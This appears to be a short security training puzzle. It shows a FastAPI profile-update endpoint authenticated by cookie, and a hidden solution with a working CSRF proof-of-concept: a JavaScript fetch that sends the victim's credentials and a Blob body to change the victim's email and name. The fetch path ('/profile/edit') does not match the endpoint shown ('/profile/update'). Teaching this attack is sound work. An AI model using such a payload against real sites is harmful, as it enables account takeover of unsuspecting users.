# FastAPI CSRF
Is this code vulnerable to CSRF? If so, drop the exploit code ;)
```python
from fastapi import FastAPI, HTTPException, Depends, Response, Request
from pydantic import BaseModel
from typing import Dict, Optional

app = FastAPI()

# Class for validating input data when updating profile
class ProfileUpdate(BaseModel):
    email: str
    name: str

# Dependency function to get the current authenticated user (simplified for context)
async def get_current_user():
    # Logic to authenticate with access_token cookie and return current user details
    ...

@app.post("/profile/update", response_model=Dict[str, str])
async def update_profile(
    update_data: ProfileUpdate,
    current_user: Dict = Depends(get_current_user)
):
    # Check if the email is already used by another user
    # Replace '...' with the logic to check and raise HTTPException if email is taken
    ...

    cursor.execute("""
    UPDATE users SET email = ?, name = ? WHERE username = ?
    """, (update_data.email, update_data.name, current_user["username"]))
    conn.commit()

    return {"message": "Profile updated successfully"}
```
<details>
  <summary>Toggle to see the solution</summary>

  FastAPI, by default, parses the request body as JSON if the `Content-Type` header is not specified. We used this behavior to create the following CSRF exploit:
  ```javascript
    fetch('https://vulnerable-corp.com/profile/edit', {
        method: "POST",
        body: new Blob([JSON.stringify({name: "pwn", email: "pwn@pwn.com"})]),
        credentials: "include",
    }).catch(error => console.error("Error:", error));
  ```
</details>